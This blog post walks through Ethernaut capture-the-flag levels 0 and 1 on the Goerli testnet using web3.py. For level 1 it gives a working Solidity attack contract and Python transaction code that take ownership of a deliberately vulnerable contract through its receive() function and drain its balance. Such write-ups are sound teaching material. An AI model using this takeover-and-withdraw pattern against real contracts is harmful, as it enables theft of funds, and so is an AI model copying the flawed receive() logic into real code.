---
layout: post
title:  Ethernaut Challenges with web3.py
date:   2023-01-22 11:50:16 +0100
categories: init
post_id: 2
---

This is a fast-paced walkthrough of the ethernaut challenges using web3.py. The goal is to get you up and running with web3.py and the ethernaut challenges as quickly as possible. If you want to learn more about web3.py, check out the [web3.py documentation](https://web3py.readthedocs.io/en/stable/).

## Setup

```python
# setup connection to test net
from web3 import Web3

# connect to a local net
l_net = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

# connect to goerli network
g_net = Web3(Web3.HTTPProvider("https://rpc.ankr.com/eth_goerli"))

g_net.isConnected()

```

```bash
True
```

- ## [Level 0](https://ethernaut.openzeppelin.com/level/0xBA97454449c10a0F04297022646E7750b8954EE8) - Hello Ethernaut

`Difficulty Level: 0/5`

### level_0 task

This level is a sanity check to make sure you understand how to interact with a smart contract.

### solution

```python
# contract address, can be obtained from the browser console
# with: contract.address
contract_addr = "0xC63C2947fcaf80d13D40742A52fF5122fec5B171"

# contract abi, obtain from browser with: contract.abi 
contract_abi = '[{ redacted due to size }]'

hello_contract = g_net.eth.contract(address=contract_addr, abi=contract_abi)

hello_contract.functions.info().call()

```

```bash
'You will find what you need in info1().'
```

```python
# from the output above, we know we have to make a call
# to info1()
hello_contract.functions.info1().call()
```

```bash
'Try info2(), but with "hello" as a parameter.'
```

```python
# calling info2(), with 'hello' parameter
hello_contract.functions.info2('hello').call()
```

```bash
'The property infoNum holds the number of the next info method to call.'
```

```python
hello_contract.functions.infoNum().call()
```

```bash
42
```

```python
hello_contract.functions.info42().call()
```

```bash
'theMethodName is the name of the next method.'
```

```python
hello_contract.functions.theMethodName().call()
```

```bash
'The method name is method7123949.'
```

```python
hello_contract.functions.method7123949().call()
```

```bash
'If you know the password, submit it to authenticate().'
```

```python
hello_contract.functions.password().call()
```

```bash
'ethernaut0'
```

```python
hello_contract.functions.authenticate('ethernaut0').call()
```

submit the contract and challenge solved.

- ## [Level 1](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F) - Fallback

`Difficulty Level: 1/5`

### level_1 Task

Look carefully at the contract's code below. You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

### level_1 Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;

        if(contributions[msg.sender] > contributions[owner]){
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }

}

```

### level_1 Solution

From the problem statement our task is to own the contract and steal all the funds, to steal the funds from the contract we just need to be the owner of the contract and call the `withdraw()` function. But the withdraw function can only be called by the owner, due to the `onlyOwner` modifier, therefore we have to figure out a way to take ownership. Looking closely at the `contribute` function, it can be seen that we can take ownership of the contract when we send a contribution to it and our total contribution is greater than that of the current owner, `owner = msg.sender`. But this seems very difficult because of the check `require(msg.value < 0.001 ether)`, since it will take a lot of time before we can match the owners contribution (`1000 * (1 ether)`). But all hope is not lost since we have a `receive()` function that accomplish the same objective (`owner = msg.sender`) all we have to do is make sure we pass the check `require(msg.value > 0 && contributions[msg.sender] > 0)`. The following contract solves the problem.

`fallback_attack.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./fallback.sol";

contract AttackFallback {

    Fallback public fallbackContract;

    constructor(address fallbackContractAddress) {
        fallbackContract = Fallback(payable(fallbackContractAddress));
    }

    function makeContribution() public {
        fallbackContract.contribute{value: 3 wei}();
    }

    function getContribution() public view returns (uint) {
        return fallbackContract.getContribution();
    }

    function ownTheContract() public {
        payable(address(fallbackContract)).transfer(3 wei);
    }

    function lootContract() public {
        fallbackContract.withdraw();
    }

    receive() external payable {
        return ;
    }
}

```

We deploy the `fallback_attack.sol` contract, we then call the `makeContribution()` function, afterwards we call the `ownTheContract()` and `lootContract()` consecutively to solve the challenge. We accomplish that with following python code:

```python
# use the address you deployed ur
# attack contract at
contract_addr = '0x10D409B3962f5F49Dc5Ac2039bcFe06F722cfc22'

contract_abi = '[{"inputs": [],"name": "lootContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "makeContribution","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [],"name": "ownTheContract","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "address","name": "fallbackContractAddress","type": "address"}],"stateMutability": "nonpayable","type": "constructor"},{"stateMutability": "payable","type": "receive"},{"inputs": [],"name": "fallbackContract","outputs": [{"internalType": "contract Fallback","name": "","type": "address"}],"stateMutability": "view","type": "function"},{"inputs": [],"name": "getContribution","outputs": [{"internalType": "uint256","name": "","type": "uint256"}],"stateMutability": "view","type": "function"}]'


attack_contract = g_net.eth.contract(address=contract_addr, abi=contract_abi)

# your account whose private key will be used to sign the txn
my_account = "0x1234567890123456789012345678901234567890"

# your account's private key here
key = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"

nonce = lambda: g_net.eth.get_transaction_count(my_account)

# prepare makeContribution() txn
mc_txn = attack_contract.functions.makeContribution().build_transaction()
mc_txn['nonce'] = nonce()

# sign the txn
signed_mc_txn = g_net.eth.account.sign_transaction(mc_txn, key)

# send the txn
g_net.eth.send_raw_transaction(signed_mc_txn.rawTransaction)

# prepare ownTheContract() txn
otc_txn = attack_contract.functions.ownTheContract().build_transaction({
    'nonce': nonce(),
    'gas': 1000000,
    'gasPrice': g_net.eth.gas_price,
})

# sign the txn
signed_otc_txn = g_net.eth.account.sign_transaction(otc_txn, key)

# send the txn
g_net.eth.send_raw_transaction(signed_otc_txn.rawTransaction)

# prepare lootContract() txn
lc_txn = attack_contract.functions.lootContract().build_transaction({
    'nonce': nonce(),
    'gas': 1000000,
    'gasPrice': g_net.eth.gas_price,
})

# sign the txn
signed_lc_txn = g_net.eth.account.sign_transaction(lc_txn, key)

# send the txn
g_net.eth.send_raw_transaction(signed_lc_txn.rawTransaction)

```

Note that we could easily have combined all the functions into one function and call it once in the solidity contract, but I decided to split it up to demonstrate how to use web3.py.
